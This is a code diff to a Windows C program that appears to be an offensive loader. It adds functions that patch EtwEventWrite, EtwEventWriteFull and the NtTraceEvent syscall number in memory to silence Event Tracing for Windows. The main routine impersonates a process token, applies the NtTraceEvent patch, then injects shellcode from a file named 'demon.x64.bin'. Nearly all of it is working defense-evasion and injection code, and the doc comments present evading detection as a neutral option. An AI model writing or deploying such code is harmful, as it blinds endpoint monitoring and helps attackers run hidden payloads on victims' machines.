@@ -466,34 +466,137 @@ BOOL LaunchCommandWithImpersonatedUser(HANDLE hDuplicatedToken, LPCWSTR lpApplic
      return bTokenIsElevated;
  }
 
+ /**
+ * PatchEtwWriteFunctionsStart
+ *
+ * Description:
+ * Attempts to patch the Event Tracing for Windows (ETW) write functions to either enable or disable them.
+ * This could be used for various purposes, including enhancing privacy, evading detection, or debugging.
+ * It's crucial to use this function with a clear understanding of its impact on system behavior and compliance with legal and ethical standards.
+ *
+ * Parameters:
+ * ePatch - An enumeration value that specifies the type of patching to be applied. The enum should define
+ *          whether to enable, disable, or otherwise modify the ETW write functions. The exact nature of
+ *          these modifications depends on the implementation and the enum values provided.
+ *
+ * Returns:
+ * BOOL - Returns TRUE if the patching process was successful. Returns FALSE if the patching fails,
+ *        which could occur for various reasons such as lack of permissions, ETW write functions not
+ *        being found, or other errors encountered during the patching process.
+ */
  BOOL PatchEtwWriteFunctionsStart(enum PATCH ePatch) {
 
      DWORD		dwOldProtection = 0x00;
      PBYTE		pEtwFuncAddress = NULL;
-     BYTE		pPatchShellcode[] = {
-         0x33, 0xC0,    // xor eax, eax
-         0xC3           // ret
+     BYTE		pShellcode[3] = {
+         0x33, 0xC0,			// xor eax, eax
+         0xC3				// ret
      };
 
-     if (!(pEtwFuncAddress = GetProcAddress(GetModuleHandle(TEXT("NTDLL")), ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull"))) {
-         printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
+
+     // Get the address of "EtwEventWrite" OR "EtwEventWriteFull" based of 'ePatch'
+     pEtwFuncAddress = GetProcAddress(GetModuleHandleA("NTDLL"), ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull");
+     if (!pEtwFuncAddress) {
+         printf("[!] GetProcAddress failed with error  %d \n", GetLastError());
          return FALSE;
      }
 
-     if (!VirtualProtect(pEtwFuncAddress, sizeof(pPatchShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
-         printf("[!] VirtualProtect [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+
+     printf("\t[-] Address Of \"%s\" : 0x%p \n", ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull", pEtwFuncAddress);
+     printf("\t[-] Patching with \"33 C0 C3\" ... ");
+
+     // Change memory permissions to RWX
+     if (!VirtualProtect(pEtwFuncAddress, sizeof(pShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+         printf("[!] VirtualProtect [1] failed with error  %d \n", GetLastError());
          return FALSE;
      }
 
-     memcpy(pEtwFuncAddress, pPatchShellcode, sizeof(pPatchShellcode));
+     // Apply the patch
+     memcpy(pEtwFuncAddress, pShellcode, sizeof(pShellcode));
 
-     if (!VirtualProtect(pEtwFuncAddress, sizeof(pPatchShellcode), dwOldProtection, &dwOldProtection)) {
-         printf("[!] VirtualProtect [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+     // Change memory permissions to original
+     if (!VirtualProtect(pEtwFuncAddress, sizeof(pShellcode), dwOldProtection, &dwOldProtection)) {
+         printf("[!] VirtualProtect [2] failed with error  %d \n", GetLastError());
          return FALSE;
      }
+
+     printf("[+] DONE ! \n");
 
      return TRUE;
  }
+
+ /**
+ * PatchNtTraceEventSSN
+ *
+ * Description:
+ * Patches the NtTraceEvent function within the System Service Dispatch Table (SSDT) to modify
+ * its behavior for security, testing, or diagnostic purposes. This could involve disabling the function
+ * to prevent Event Tracing for Windows (ETW) events from being emitted, redirecting calls to a custom handler,
+ * or logging calls for analysis. This function directly manipulates system-level structures and should be used
+ * with caution, understanding the potential impacts on system stability and security. Proper permissions
+ * and safety checks should be in place to avoid system crashes or security vulnerabilities.
+ *
+ * Parameters:
+ * This function currently does not take any parameters. Future versions might include parameters to control
+ * the behavior of the patch more finely, such as specifying the exact nature of the patch or providing a callback.
+ *
+ * Returns:
+ * BOOL - Returns TRUE if the patching process is successful, indicating that NtTraceEvent has been
+ *        appropriately modified according to the function's implementation. Returns FALSE if the patching
+ *        fails, which could be due to insufficient permissions, failure to locate the SSDT, or other
+ *        errors encountered during the attempt to modify system behavior.
+ */
+ BOOL PatchNtTraceEventSSN() {
+
+     DWORD		dwOldProtection = 0x00;
+     PBYTE		pNtTraceEvent = NULL;
+
+     // Get the address of "NtTraceEvent"
+     pNtTraceEvent = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "NtTraceEvent");
+     if (!pNtTraceEvent)
+         return FALSE;
+
+     printf("\t[-] Address of \"NtTraceEvent\" : 0x%p \n", pNtTraceEvent);
+
+     // Search for NtTraceEvent's SSN pointer
+     for (int i = 0; i < x64_SYSCALL_STUB_SIZE; i++) {
+
+         if (pNtTraceEvent[i] == x64_MOV_INSTRUCTION_OPCODE) {
+             // Set the pointer to NtTraceEvent's SSN and break
+             pNtTraceEvent = (PBYTE)(&pNtTraceEvent[i] + 1);
+             break;
+         }
+
+         // If we reached the 'ret' or 'syscall' instruction, we fail
+         if (pNtTraceEvent[i] == x64_RET_INSTRUCTION_OPCODE || pNtTraceEvent[i] == 0x0F || pNtTraceEvent[i] == 0x05)
+             return FALSE;
+     }
+
+     printf("\t[-] Position Of NtTraceEvent's SSN : 0x%p \n", pNtTraceEvent);
+     printf("\t[-] Patching with \"FF\" ... ");
+
+     // Change memory permissions to RWX
+     if (!VirtualProtect(pNtTraceEvent, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+         printf("[!] VirtualProtect [1] failed with error  %d \n", GetLastError());
+         return FALSE;
+     }
+
+     // Apply the patch - Replacing NtTraceEvent's SSN with a dummy one
+     // Dummy SSN in reverse order
+     *(PDWORD)pNtTraceEvent = 0x000000FF;
+
+     // Change memory permissions to original
+     if (!VirtualProtect(pNtTraceEvent, sizeof(DWORD), dwOldProtection, &dwOldProtection)) {
+         printf("[!] VirtualProtect [2] failed with error  %d \n", GetLastError());
+         return FALSE;
+     }
+
+     printf("[+] DONE ! \n");
+
+     return TRUE;
+ }
+
+
 
 int wmain(int argc, WCHAR** argv, WCHAR** envp)
 {
@@ -532,8 +635,9 @@ int wmain(int argc, WCHAR** argv, WCHAR** envp)
     // Token impersonation 
     ImpersonateProcess(dwProcessId); 
     // EtwPatching 
-    PatchEtwWriteFunctionsStart(PATCH_ETW_EVENTWRITE);
-    PatchEtwWriteFunctionsStart(PATCH_ETW_EVENTWRITE_FULL);
+    //PatchEtwWriteFunctionsStart(PATCH_ETW_EVENTWRITE);
+    //PatchEtwWriteFunctionsStart(PATCH_ETW_EVENTWRITE_FULL);
+    PatchNtTraceEventSSN();
     InjectShellcodeFileLocally(L"demon.x64.bin"); // shellcode 
 
 
